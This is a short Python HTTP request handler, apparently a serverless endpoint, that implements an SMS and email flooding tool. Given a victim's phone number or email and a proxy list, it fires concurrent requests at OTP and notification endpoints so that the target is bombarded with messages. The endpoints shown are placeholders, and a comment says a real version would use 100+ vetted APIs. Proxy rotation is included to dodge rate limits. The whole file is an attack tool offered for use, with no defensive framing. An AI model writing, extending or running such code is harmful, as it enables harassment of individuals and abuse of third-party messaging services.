import json
import asyncio
import aiohttp
from http.server import BaseHTTPRequestHandler

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        try:
            data = json.loads(post_data)
            action = data.get('action', 'flood')
            
            if action == 'flood':
                target = data.get('target', '') # Phone or Email
                mode = data.get('mode', 'sms') # sms or email
                proxies = data.get('proxies', [])
                
                results = asyncio.run(self.run_flood(target, mode, proxies))
                self._json(200, {
                    "status": "success",
                    "target": target,
                    "dispatched": len(results),
                    "note": "TSUNAMI FLOOD PROTOCOL ENGAGED"
                })
            else:
                self._json(400, {"error": "Invalid action"})
        except Exception as e:
            self._json(400, {"error": str(e)})

    async def fire_request(self, session, url, proxy):
        try:
            async with session.get(url, proxy=proxy, timeout=5) as r:
                return r.status
        except:
            return 500

    async def run_flood(self, target, mode, proxies):
        # Placeholder endpoints that trigger OTPs/Notifications
        # In a real scenario, you'd have a list of 100+ vetted APIs
        sms_endpoints = [
            f"https://api.example-shop.com/v1/otp/send?phone={target}",
            f"https://auth.shipping-portal.io/request?number={target}",
            f"https://msg.delivery-notices.net/api/v2/sms?to={target}"
        ]
        
        email_endpoints = [
            f"https://notify.alibaba-shipping.com/alert?email={target}",
            f"https://status.amazon-fulfillment.net/ping?user={target}"
        ]
        
        urls = sms_endpoints if mode == 'sms' else email_endpoints
        
        connector = aiohttp.TCPConnector(limit=50)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for i, url in enumerate(urls):
                proxy = proxies[i % len(proxies)] if proxies else None
                tasks.append(self.fire_request(session, url, proxy))
            
            return await asyncio.gather(*tasks)

    def _json(self, code, data):
        self.send_response(code)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
